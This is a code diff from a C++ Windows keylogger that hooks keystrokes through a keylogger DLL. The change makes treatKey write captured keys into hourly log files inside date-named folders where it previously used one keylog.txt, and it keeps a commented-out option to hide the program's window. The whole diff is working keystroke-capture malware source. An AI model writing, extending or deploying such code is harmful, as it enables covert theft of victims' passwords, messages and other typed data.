@@ -2,6 +2,8 @@
 #include <iostream>
 #include <windows.h>
 #include <conio.h>
+#include <time.h>
+#include <direct.h>
 #include "../keyloggerDll/keyloggerDll.h"
 
 #define KEYLOGGER_DLL "KeyloggerDll.dll"
@@ -15,10 +17,29 @@ HINSTANCE g_hInst;
 HHOOK g_hHook = NULL;
 HWND hWnd = NULL;
 
+const string currentDateTime(int flags) {
+	time_t     now = time(0); //현재 시간을 time_t 타입으로 저장
+	struct tm  tstruct;
+	char       buf[80];
+	tstruct = *localtime(&now);
+	if (flags == 1) {
+		strftime(buf, sizeof(buf), "%Y-%m-%d", &tstruct); // YYYY-MM-DD 형태의 스트링
+	}
+	else if (flags == 2) {
+		strftime(buf, sizeof(buf), "%Y-%m-%d-%H.txt", &tstruct); // YYYY-MM-DD-HH 형태의 스트링
+	}
+	
+	return buf;
+}
+
 int treatKey(string charPressed, DWORD key)
 {
+	string Date = currentDateTime(1);	// 하루단위 폴더 생성을 위한 시간 구하기
+	string DateTime = currentDateTime(2);	// 시간단위 파일 생성을 위한 시간 구하기
 	FILE *FP;
-	fopen_s(&FP, "keylog.txt", "a");
+
+	_mkdir(Date.c_str());
+	fopen_s(&FP, (Date +"\\"+ DateTime).c_str(), "a");
 	fprintf(FP, "%s", charPressed.c_str());
 	fclose(FP);
 	return 0;
@@ -361,9 +382,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance
 		WndClass.style = CS_HREDRAW | CS_VREDRAW;
 		RegisterClass(&WndClass);
 
-		hWnd = CreateWindow(lpszClass, lpszClass, WS_OVERLAPPEDWINDOW,
-			CW_USEDEFAULT, CW_USEDEFAULT, 500, 100,
-			NULL, (HMENU)NULL, hInstance, NULL);
+		hWnd = CreateWindow(lpszClass, lpszClass, WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 500, 100, NULL, (HMENU)NULL, hInstance, NULL);
 		//ShowWindow(hWnd, SW_HIDE);  // SW_HIDE : 윈도우 숨기기, nCmdShow : 윈도우 보이기
 		//hWndMain = hWnd;
 
